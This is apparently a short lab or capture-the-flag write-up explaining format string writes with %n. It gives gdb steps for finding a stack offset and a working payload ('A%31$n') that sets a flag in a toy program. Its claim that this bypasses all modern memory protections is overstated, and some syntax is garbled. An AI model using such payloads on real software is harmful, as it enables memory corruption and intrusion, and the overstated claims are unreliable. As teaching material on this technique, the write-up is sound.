## Writing Values with Format String (Part 1)
Similar to reading values with the same exploit, but this time, we're using %n to write to a pointer. <br />
This is very important: `%n` MUST be a pointer. Otherwise, this will not work.
```bash
%<num>$n
$n
```
`$n` will take the length of everything proceeding it, and chuck it inside the specified pointer. <br />
So... if I wanted to write 1 into the 2nd to last pointer, I'd do...
```bash
`%<size>x`
```
Instead of writing A, I could also just do 
```bash
%1x   %2$n
```
since C automatically pads format parameters that have `%[num]`.
<br /><br />

1. If necessary, `$gdb` debug to pinpoint address of the pointer you want to write to
2. $gdb debug to obtain stack before printf (telescope command works really well here)
3. While looking at the stack, find the pointer address offset (usually in 4-byte chunks)
4. Insert proper `%n` string to modify value.

Again, because we're not messing with the stack, this bypasses all modern memory protections (such as ASLR)
<br /><br />
You could do something finnicky with high/low order bytes too, but I find that it's usually not worth it

## Demo - in $gdb
First, we'll analyze the code in `main()`
```gdb
start
x/100i main
```
Set breakpoints at malloc() and printf() so we can perform calculations on them later
```gdb
b *0x565561fd 
b *0x5655625c
continue
```
Pinpoint address of pointer you want to write to. My assembly said the pointer is stored at `$ebp - 0xc`, so that's what we're finding
```gdb
print $ebp - 0xc
continue
```
Find the address offset of the pointer we just got. For us, there was a 124 byte difference. In a 32-bit system (4 byte memory), that is a `124/4 = 31` address offset.
```gdb
telescope 50
exit
```

## Demo - Exploit
Now that we know that we need to:
1. Write a value of 1 `(TRUE)`
2. Write to address offset 31

We can start crafting our format string `%n` statement.
```bash
A%31$n
```

And there we go. Now you should see classified McDonalds information.